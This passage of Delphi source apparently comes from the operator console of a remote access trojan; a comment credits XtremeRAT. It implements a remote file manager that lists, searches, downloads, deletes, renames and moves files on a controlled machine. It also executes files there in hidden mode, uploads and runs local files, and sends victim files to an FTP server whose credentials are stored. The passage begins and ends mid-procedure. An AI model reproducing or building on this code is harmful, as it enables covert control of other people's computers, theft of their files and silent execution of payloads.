          Delete(TmpStr, 1, Pos('\', TmpStr));           
          if (Length(TmpStr1) = 2) and (Pos(':', TmpStr1) > 0) then TmpStr1 := TmpStr1 + '\';
          TmpNode := FindNode(TmpStr1, tv1, LastNode);
          if TmpStr1 = '' then Continue;
          LastNode := TmpNode;
        end;

        LastNode.Delete;
        tv1.Items.EndUpdate;
      end;
    end
    else

    if MainCommand = FILESEDITFILE then
    begin
      SendMessage(Handle, WM_SHOW_EDITFILEFORM, Integer(Datas), 0);
    end
    else

    if MainCommand = FILESEDITFILESAVE then
    begin
      AddRecvLog('Failed to edit file ' + Datas, clRed);
    end
    else

    if MainCommand = FILESSENDFTP then
    begin
      AddRecvLog('Failed to send file ' + Datas + ' to FTP', clRed);
    end
    else

    if MainCommand = FILESSETATTRIBUTES then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr2 := TmpStr1;

      if Datas = 'N' then
        AddRecvLog('Failed to set attributes of ' + TmpStr)
      else
      begin
        lvFiles.Items.BeginUpdate;

        for i := 0 to lvFiles.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if lvFiles.Items.Item[i].Caption <> ExtractFileName(TmpStr) then Continue;
          lvFiles.Items.Item[i].SubItems[2] := TmpStr1;
          if Pos('H', TmpStr1) <= 0 then
          begin
            lvFiles.Items.Item[i].Data := TObject(clBlack);
            lvFiles.Items.Item[i].Cut := False;
          end
          else
          begin
            lvFiles.Items.Item[i].Data := TObject(clGray);
            lvFiles.Items.Item[i].Cut := True;
          end;
        end;

        lvFiles.Items.EndUpdate;
        AddRecvLog('Attributes of ' + TmpStr + ' set to ' + TmpStr1);;

        if ExtractFileExt(TmpStr) <> '' then Exit;

        tv1.Items.BeginUpdate;
        TmpStr := TmpStr + '\';
        LastNode := nil;

        while Pos('\', TmpStr) > 0 do
        begin
          Application.ProcessMessages;
          TmpStr1 := Copy(TmpStr, 1, Pos('\', TmpStr) - 1);
          Delete(TmpStr, 1, Pos('\', TmpStr));   
          if (Length(TmpStr1) = 2) and (Pos(':', TmpStr1) > 0) then TmpStr1 := TmpStr1 + '\';
          TmpNode := FindNode(TmpStr1, tv1, LastNode);
          if TmpStr1 = '' then Continue;
          LastNode := TmpNode;
        end;

        if Pos('H', TmpStr2) <= 0 then
        begin
          LastNode.Data := TObject(clBlack);
          LastNode.Cut := False;
        end
        else
        begin
          LastNode.Data := TObject(clGray);
          LastNode.Cut := True;
        end;

        tv1.Items.EndUpdate;
      end;
    end
    else
    
    if MainCommand = FILESSEARCHRESULTS then
    begin
      lvSearch.Clear;
                       
      if Datas = '' then
      begin
        AddRecvLog('File not found', clRed);
        Exit;
      end;

      pb1.Max := StringCount(#13#10, Datas);
      pb1.Position := 0;

      lvSearch.Items.BeginUpdate;

      while Datas <> '' do
      begin
        Self.Refresh;
        Application.ProcessMessages;
        pb1.Position := pb1.Position + 1;

        TmpStr := Copy(Datas, 1, Pos(#13#10, Datas) - 1);
        Delete(Datas, 1, Pos(#13#10, Datas) + 1);

        TmpList := ParseString('|', TmpStr);

        TmpItem := lvSearch.Items.Add;
        TmpItem.Caption := TmpList[0];
        TmpItem.SubItems.Add(FileSizeToStr(StrToInt(TmpList[1])));

        if FileExists(TmpItem.Caption) = True then
          TmpItem.ImageIndex := GetImageIndex(TmpItem.Caption)
        else TmpItem.ImageIndex := GetImageIndex('*' + ExtractFileExt(TmpItem.SubItems.Strings[0]));
      end;

      lvSearch.Items.EndUpdate;
      btn9.Click;
      AddRecvLog(IntToStr(lvSearch.Items.Count) + ' files found');
    end
    else
                 
    if MainCommand = FILESSEARCHDELETEFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if Datas = 'N' then
        AddRecvLog('Failed to delete file ' + TmpStr, clRed)
      else
      begin
        lvSearch.Items.BeginUpdate;
        for i := lvSearch.Items.Count - 1 downto 0 do
        begin
          Application.ProcessMessages;
          if lvSearch.Items.Item[i].Caption <> TmpStr then Continue;
          lvSearch.Items.Item[i].Delete;
          Break;
        end;

        lvSearch.Items.EndUpdate;
        AddRecvLog('File ' + TmpStr + ' deleted successfully');
      end;
    end
    else
           
    if MainCommand = FILESSEARCHRENAMEFILE then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));

      if TmpStr1 = 'N' then
        AddRecvLog('Failed to rename file ' + TmpStr + ' by ' + TmpStr1, clRed)
      else
      begin
        lvSearch.Items.BeginUpdate;
        for i := 0 to lvSearch.Items.Count - 1 do
        begin
          Application.ProcessMessages;
          if lvSearch.Items.Item[i].Caption = TmpStr then
          lvSearch.Items.Item[i].Caption := Datas;
        end;

        lvSearch.Items.EndUpdate;
        AddRecvLog('File ' + TmpStr + ' renamed by ' + TmpStr1 + ' successfully');
      end;
    end
    else

    if MainCommand = FILESIMAGEPREVIEW then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      AddRecvLog('Image stream of size ' + FileSizeToStr(Stream.Size));

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      if TmpForm1.Visible then TmpForm1.AddThumb(Bmp, TmpStr);
      Bmp.Free;
    end;
  end;
end;
        
procedure TFormFilesManager.lvFilesCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormFilesManager.tv1CustomDrawItem(Sender: TCustomTreeView;
  Node: TTreeNode; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Node.Data <> nil then Sender.Canvas.Font.Color := TColor(Node.Data);
end;

procedure TFormFilesManager.tv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(tv1.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;

  if L1.Tag <> 1 then pm1.Items[3].Enabled := True else pm1.Items[3].Enabled := False;
  if L2.Tag <> 1 then pm1.Items[4].Enabled := True else pm1.Items[4].Enabled := False;
end;

procedure TFormFilesManager.lvFilesContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvFiles.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[0].Enabled := True;

    
    if Length(ExplorerPath) = 3 then
    begin
      pm2.Items[1].Enabled := True;
      pm2.Items[5].Enabled := True;
      pm2.Items[9].Enabled := True;
      pm2.Items[13].Enabled := True;
      pm2.Items[13].Items[0].Enabled := False;
      pm2.Items[13].Items[1].Enabled := False;
      pm2.Items[13].Items[3].Enabled := True;
      pm2.Items[21].Enabled := True;
      pm2.Items[23].Enabled := True;
      pm2.Items[24].Enabled := True;
    end
    else

    if Length(ExplorerPath) > 3 then
    begin
      pm2.Items[1].Enabled := True;
      pm2.Items[2].Enabled := True;
      pm2.Items[5].Enabled := True;
      pm2.Items[9].Enabled := True;   
      pm2.Items[13].Enabled := True;
      pm2.Items[13].Items[0].Enabled := False;
      pm2.Items[13].Items[1].Enabled := False;
      pm2.Items[13].Items[3].Enabled := True;
      pm2.Items[21].Enabled := True;   
      pm2.Items[23].Enabled := True;
      pm2.Items[24].Enabled := True;
    end;

    if lvFiles.Items.Count > 0 then
    pm2.Items[15].Enabled := True;
  end
  else
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;

    if lvFiles.Selected.ImageIndex = 3 then
    begin
      pm2.Items[16].Enabled := False;
      pm2.Items[19].Enabled := False;
      pm2.Items[20].Enabled := False;
    end
    else
    begin
      pm2.Items[4].Enabled := False;
      pm2.Items[16].Enabled := True;
      pm2.Items[19].Enabled := True;
      pm2.Items[20].Enabled := True;
    end;

    if lvFiles.SelCount > 1 then
    begin
      pm2.Items[6].Enabled := False;
      pm2.Items[7].Enabled := False;
      pm2.Items[8].Enabled := False; 
      pm2.Items[10].Enabled := False;
      pm2.Items[11].Enabled := False;
      pm2.Items[17].Enabled := False;
      pm2.Items[19].Enabled := False;
      pm2.Items[13].Items[0].Enabled := False;
      pm2.Items[13].Items[1].Enabled := False;
    end
    else
    begin
      pm2.Items[6].Enabled := True;
      pm2.Items[7].Enabled := True;
      pm2.Items[8].Enabled := True;
      pm2.Items[10].Enabled := True;
      pm2.Items[11].Enabled := True; 
      pm2.Items[17].Enabled := True;
      pm2.Items[19].Enabled := True;
      pm2.Items[13].Items[0].Enabled := True;
      pm2.Items[13].Items[1].Enabled := True;
    end;
  end;
end;

procedure TFormFilesManager.lvSearchContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvSearch.Selected) then
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False
  else
  begin
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;

    if lvFiles.SelCount > 1 then
    begin
      pm3.Items[0].Enabled := False;
      pm3.Items[2].Enabled := False;
      pm3.Items[3].Enabled := False;
      pm3.Items[4].Enabled := False;
      pm3.Items[7].Enabled := False;
      pm3.Items[10].Enabled := False;
    end
    else
    begin
      pm3.Items[0].Enabled := True;
      pm3.Items[2].Enabled := True;
      pm3.Items[3].Enabled := True;
      pm3.Items[4].Enabled := True;
      pm3.Items[7].Enabled := True;
      pm3.Items[10].Enabled := True;
    end;
  end;
end;

procedure TFormFilesManager.R1Click(Sender: TObject);
begin
  Client.SendDatas(FILESLISTDRIVES + '|');
  AddSentLog('Get drives list');
end;

procedure TFormFilesManager.D1Click(Sender: TObject);
begin
  if not Assigned(tv1.Selected) then Exit;
  if tv1.Selected.Data = nil then Exit;
  MessageBox(Handle, PChar(TDriveInfos(tv1.Selected.Data).Infos), 'Drive infos', MB_ICONINFORMATION);
end;

procedure TFormFilesManager.L1Click(Sender: TObject);
begin
  Client.SendDatas(FILESLISTSHAREDFOLDERS + '|');
  AddSentLog('Get shared folders list <- this process can takes a while, please wait');
end;

procedure TFormFilesManager.L2Click(Sender: TObject);
begin
  Client.SendDatas(FILESLISTSPECIALSFOLDERS + '|');    
  AddSentLog('Get specials folders list');
end;

procedure TFormFilesManager.tv1DblClick(Sender: TObject);
var
  TmpStr: string;
begin
  if (ExplorerPath = '') or (ExplorerPath = Client.Infos.Computer) then Exit;

  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath) - 1) = Client.Infos.Computer then
  begin
    Delete(ExplorerPath, 1, Length(Client.Infos.Computer) + 1);
    Delete(ExplorerPath, 3, Length('\'));
  end
  else

  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath) - 1) = SpecialsFolders then
  begin
    Delete(ExplorerPath, 1, Length(SpecialsFolders) + 1);
    Delete(ExplorerPath, Length(ExplorerPath), Length(ExplorerPath) - 1);
  end
  else

  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath) - 1) = SharedFolders then
  begin
    Delete(ExplorerPath, 1, Length(SharedFolders) + 1);
    Delete(ExplorerPath, Length(ExplorerPath), Length(ExplorerPath) - 1);
  end
  else

  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath) - 1) = Bookmarks then
  begin
    Delete(ExplorerPath, 1, Length(Bookmarks) + 1);
    Delete(ExplorerPath, Length(ExplorerPath), Length(ExplorerPath) - 1);
  end;

  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.lvFilesDblClick(Sender: TObject);
begin
  if not Assigned(lvFiles.Selected) then Exit;
  if lvFiles.Selected.ImageIndex = 3 then
  begin
    BackwardPath := ExplorerPath;
    ForwardPath := '';
    ExplorerPath := ExplorerPath + lvFiles.Selected.Caption + '\'; 
    tv1.Enabled := False;
    Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
    AddSentLog('Set directory to ' + ExplorerPath);
  end;
end;

procedure TFormFilesManager.O1Click(Sender: TObject);
begin
  lvFilesDblClick(Sender);
end;

procedure TFormFilesManager.G1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Go to', 'Enter path name', TmpStr) then Exit;
  if (Pos(':', TmpStr) < 0) or (Pos('\', TmpStr) < 0) then
  begin
    MessageBox(Handle, 'Invalid path name.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if TmpStr[Length(TmpStr)] <> '\' then TmpStr := TmpStr + '\';
  BackwardPath := ExplorerPath;
  ForwardPath := '';
  ExplorerPath := TmpStr;
                                                
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.R2Click(Sender: TObject);
begin
  if ExplorerPath = '' then Exit;
  BackwardPath := '';
  ForwardPath := '';               
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
end;

procedure TFormFilesManager.N3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if ExplorerPath = '' then Exit;
  if not InputQuery('New folder', 'Enter folder name', TmpStr) then Exit;
  if not CheckValidName(TmpStr) then Exit;
  Client.SendDatas(FILESNEWFOLDER + '|' + ExplorerPath + TmpStr);
  AddSentLog('Create folder ' + ExplorerPath + TmpStr);
end;

procedure TFormFilesManager.H1Click(Sender: TObject);
begin
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + ExplorerPath + lvFiles.Selected.Caption + '||N');
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in hidden mode');
end;

procedure TFormFilesManager.V1Click(Sender: TObject);
begin
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + ExplorerPath + lvFiles.Selected.Caption + '||N');
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in visible mode');
end;

procedure TFormFilesManager.C1Click(Sender: TObject);
begin
  ClipboardPath := 'COPY|' + IntToStr(lvFiles.Selected.ImageIndex) + '|' + ExplorerPath + lvFiles.Selected.Caption;
  AddLog('File ' + ExplorerPath + lvFiles.Selected.Caption + ' copied to clipboard');
end;

procedure TFormFilesManager.C2Click(Sender: TObject);
begin
  ClipboardPath := 'CUT|' + IntToStr(lvFiles.Selected.ImageIndex) + '|' + ExplorerPath + lvFiles.Selected.Caption;
  AddLog('File ' + ExplorerPath + lvFiles.Selected.Caption + ' copied to clipboard');
end;

procedure TFormFilesManager.P2Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  if (ExplorerPath = '') or (ClipboardPath = '') then Exit;
  
  TmpStr := Copy(ClipboardPath, 1, 3);
  Delete(ClipboardPath, 1, Pos('|', ClipboardPath));
  TmpStr1 := Copy(ClipboardPath, 1, Pos('|', ClipboardPath) - 1);
  Delete(ClipboardPath, 1, Pos('|', ClipboardPath));

  if TmpStr = 'CUT' then
  begin
    if StrToInt(TmpStr1) = 3 then
    begin
      Client.SendDatas(FILESMOVEFOLDER + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
      AddSentLog('Move folder ' + ClipboardPath + ' to ' + ExplorerPath + ExtractFileName(ClipboardPath));
    end
    else
    begin
      Client.SendDatas(FILESMOVEFILE + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
      AddSentLog('Move file ' + ClipboardPath + ' to ' + ExplorerPath + ExtractFileName(ClipboardPath));
    end;
  end
  else
  begin
    if StrToInt(TmpStr1) = 3 then
    begin
      Client.SendDatas(FILESCOPYFOLDER + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
      AddSentLog('Copy folder ' + ClipboardPath + ' to ' + ExplorerPath + ExtractFileName(ClipboardPath));
    end
    else
    begin
      Client.SendDatas(FILESCOPYFILE + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
      AddSentLog('Copy file ' + ClipboardPath + ' to ' + ExplorerPath + ExtractFileName(ClipboardPath));
    end;
  end;
end;

procedure TFormFilesManager.R3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Rename file/folder', 'New name', TmpStr) then Exit;
  if lvFiles.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(FILESRENAMEFOLDER + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + ExplorerPath + TmpStr);
    AddSentLog('Rename folder ' + ExplorerPath + lvFiles.Selected.Caption + ' by ' + ExplorerPath + TmpStr);
  end
  else
  begin
    Client.SendDatas(FILESRENAMEFILE + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + ExplorerPath + TmpStr);
    AddSentLog('Rename file ' + ExplorerPath + lvFiles.Selected.Caption + ' by ' + ExplorerPath + TmpStr);
  end;
end;

procedure TFormFilesManager.M1Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lvFiles.Selected) then Exit;
  if not InputQuery('Move file/folder to', 'Enter path name', TmpStr) then Exit;
  if (Pos(':', TmpStr) < 0) or (Pos('\', TmpStr) < 0) then
  begin
    MessageBox(Handle, 'Invalid path name.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if TmpStr[Length(TmpStr)] <> '\' then TmpStr := TmpStr + '\';

  if lvFiles.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(FILESMOVEFOLDER + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + lvFiles.Selected.Caption);
    AddSentLog('Move folder ' + ExplorerPath + lvFiles.Selected.Caption + ' to ' + TmpStr + lvFiles.Selected.Caption);
  end
  else
  begin
    Client.SendDatas(FILESMOVEFILE + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + lvFiles.Selected.Caption);
    AddSentLog('Move file ' + ExplorerPath + lvFiles.Selected.Caption + ' to ' + TmpStr + lvFiles.Selected.Caption);
  end;
end;

procedure TFormFilesManager.C4Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not Assigned(lvFiles.Selected) then Exit;
  if not InputQuery('Copy file/folder to', 'Enter path name', TmpStr) then Exit;
  if (Pos(':', TmpStr) < 0) or (Pos('\', TmpStr) < 0) then
  begin
    MessageBox(Handle, 'Invalid path name.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  if TmpStr[Length(TmpStr)] <> '\' then TmpStr := TmpStr + '\';

  if lvFiles.Selected.ImageIndex = 3 then
  begin
    Client.SendDatas(FILESCOPYFOLDER + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + lvFiles.Selected.Caption);
    AddSentLog('Copy folder ' + ExplorerPath + lvFiles.Selected.Caption + ' to ' + TmpStr + lvFiles.Selected.Caption);
  end
  else
  begin
    Client.SendDatas(FILESCOPYFILE + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + TmpStr + lvFiles.Selected.Caption);
    AddSentLog('Copy file ' + ExplorerPath + lvFiles.Selected.Caption + ' to ' + TmpStr + lvFiles.Selected.Caption);
  end;
end;

//From XtremeRAT
function TFormFilesManager.IsImageFile(Ext: string): Boolean;
var
  i: Integer;
begin
  Result := False;
  for i := 0 to High(ImageType) do
  begin
    if LowerCase(Ext) = ImageType[i] then
    begin
      Result := True;
      Break;
    end;
  end;
end;

procedure TFormFilesManager.I1Click(Sender: TObject);
var
  TmpStr: string;
  TmpItem: TListItem;
  i: Integer;
begin                                                                       
  TmpForm1 := TFormImagePreview.Create(TFormFilesManager(Client.Forms[2]));
  TmpForm1.SetParameters(TFormFilesManager(Client.Forms[2]).Handle, ExplorerPath);

  for i := 0 to lvFiles.Items.Count - 1 do
  begin
    if (lvFiles.Items.Item[i].ImageIndex = 3) or (not IsImageFile(lvFiles.Items.Item[i].SubItems[0])) then Continue;
    TmpStr := TmpStr + ExplorerPath + lvFiles.Items.Item[i].Caption + '|';
    TmpItem := TmpForm1.lvImage.Items.Add;
    TmpItem.Caption := lvFiles.Items.Item[i].Caption;
    TmpItem.ImageIndex := -1;
  end;

  if TmpStr = '' then  Exit;
  Client.SendDatas(FILESIMAGEPREVIEW + '|' + IntToStr(TmpForm1.ThumbSize) + '|' + TmpStr);
  AddSentLog('Get images preview of directory ' + ExplorerPath);

  TmpForm1.ShowModal;
end;

function TFormFilesManager.IsExeFile(Ext: string): Boolean;
var
  i: Integer;
begin
  Result := False;
  for i := 0 to High(ExeType) do
  begin
    if LowerCase(Ext) = ExeType[i] then
    begin
      Result := True;
      Break;
    end;
  end;
end;

procedure TFormFilesManager.E2Click(Sender: TObject);
var
  i: Integer;
begin
  for i := 0 to lvFiles.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if not lvFiles.Items.Item[i].Selected then Continue;
    if lvFiles.Items.Item[i].ImageIndex <> 3 then
    if (not IsImageFile(lvFiles.Items.Item[i].SubItems[0]))
      and (not IsExeFile(lvFiles.Items.Item[i].SubItems[0]))
    then
    begin
      Client.SendDatas(FILESEDITFILE + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption);
      AddSentLog('Edit file ' + ExplorerPath + lvFiles.Items.Item[i].Caption);
    end;
  end;
end;

procedure TFormFilesManager.E4Click(Sender: TObject);
var
  TmpStr: string;
begin
  if ExplorerPath = '' then Exit;
  if not InputQuery('Empty file', 'Enter filename', TmpStr) then Exit;
  if not CheckValidName(TmpStr) then Exit;
  Client.SendDatas(FILESNEWFILE + '|' + ExplorerPath + TmpStr);
  AddSentLog('Create file ' + ExplorerPath + TmpStr);
end;

procedure TFormFilesManager.D2Click(Sender: TObject);
var
  i: Integer;
begin
  for i := 0 to lvFiles.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if lvFiles.Items.Item[i].Selected then
    if lvFiles.Items.Item[i].ImageIndex <> 3 then
    begin
      Client.SendDatas(FILESDOWNLOADFILE + '|' + ExplorerPath + lvFiles.Items.Item[i].Caption);
      AddSentLog('Get file ' + ExplorerPath + lvFiles.Items.Item[i].Caption);
    end;
  end;
end;

procedure TFormFilesManager.P1Click(Sender: TObject);
begin
  btn5Click(Sender);
end;

procedure TFormFilesManager.C5Click(Sender: TObject);
begin
  if ExplorerPath = '' then Exit;
  SetClipboardText(ExplorerPath + lvFiles.Selected.Caption);
  AddLog('Path ' + ExplorerPath + lvFiles.Selected.Caption + ' copied to clipboard');
end;

procedure TFormFilesManager.btn6Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := edtPath.Text;
  if TmpStr = '' then Exit;
  if edtFilename.Text = '' then Exit;
  btn6.Enabled := False;
  btn9.Enabled := True;

  TmpStr1 := FILESSEARCHFILE + '|' + TmpStr + '|' + edtFilename.Text + '|' + MyBoolToStr(chkSubdir.Checked);
  Client.SendDatas(TmpStr1);    
  AddSentLog('Search file ' + edtFilename.Text + ' in directory ' + TmpStr);
end;

procedure TFormFilesManager.btn9Click(Sender: TObject);
begin
  btn6.Enabled := True;
  btn9.Enabled := False;
  Client.SendDatas(FILESSTOPSEARCHING + '|');    
  AddLog('File searching stopped');
end;

procedure TFormFilesManager.V3Click(Sender: TObject);
begin
  Client.SendDatas(FILESEXECUTEVISIBLE + '|' + lvSearch.Selected.Caption + '||N');   
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in visible mode');
end;

procedure TFormFilesManager.H2Click(Sender: TObject);
begin
  Client.SendDatas(FILESEXECUTEHIDEN + '|' + lvSearch.Selected.Caption + '||N');  
  AddSentLog('Execute file ' + ExplorerPath + lvFiles.Selected.Caption + ' in hidden mode');
end;

procedure TFormFilesManager.E7Click(Sender: TObject);
begin
  ExplorerPath := ExtractFilePath(lvSearch.Selected.Caption);
  if ExplorerPath = '' then Exit;
  BackwardPath := '';
  ForwardPath := '';                          
  tv1.Enabled := False;
  Client.SendDatas(FILESLISTFOLDERS + '|' + ExplorerPath);
  AddSentLog('Set directory to ' + ExplorerPath);
  pnlExplorer.BringToFront;
end;

procedure TFormFilesManager.D5Click(Sender: TObject);
var
  i: Integer;
begin
  for i := 0 to lvSearch.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if lvSearch.Items.Item[i].Selected then
    begin
      Client.SendDatas(FILESDOWNLOADFILE + '|' + lvSearch.Items.Item[i].Caption);
      AddSentLog('Get file ' + lvSearch.Items.Item[i].Caption);
    end;
  end;
end;

procedure TFormFilesManager.FormShow(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  TmpStr: string;
begin
  btn1Click(Sender);

  TmpStr := GetSettingsFolder(Client.UserId) + '\Bookmarks.settings';
  JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  BookmarksPath := JSONConfig.ReadString('Bookmarks');
  JSONConfig.Free;
end;

procedure TFormFilesManager.S3Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
  JSONConfig: TJSONConfig;
begin  
  if not Assigned(lvFiles.Selected) then Exit;

  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  Client.SendDatas(FILESSENDFTP + '|' + ExplorerPath + lvFiles.Selected.Caption + '|' + FtpHost + '|' +
    FtpUser + '|' + FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort) + '|');
  AddSentLog('Send file ' + ExplorerPath + lvFiles.Selected.Caption + ' to FTP');
           
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.U1Click(Sender: TObject);
begin
  if ExplorerPath = '' then Exit;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  case MessageBox(Handle, 'Do you want to execute file?', PROGRAMINFOS,
    MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES:  begin
              Client.SendDatas(FILESUPLOADFILEFROMLOCAL + '|' + ExplorerPath + '|' +
                dlgOpen1.FileName + '|Y|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
              AddSentLog('Downlload file ' + dlgOpen1.FileName + ' and execute');
            end;
    IDNO: begin
            Client.SendDatas(FILESUPLOADFILEFROMLOCAL + '|' + ExplorerPath + '|' +
              dlgOpen1.FileName + '|N|' + IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
            AddSentLog('Download file ' + dlgOpen1.FileName);
          end;
    IDCANCEL: Exit;
  end;
end;

procedure TFormFilesManager.S1Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
  JSONConfig: TJSONConfig;
begin
  if not Assigned(lvSearch.Selected) then Exit;

  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  Client.SendDatas(FILESSENDFTP + '|' + lvSearch.Selected.Caption + '|' + FtpHost + '|' +
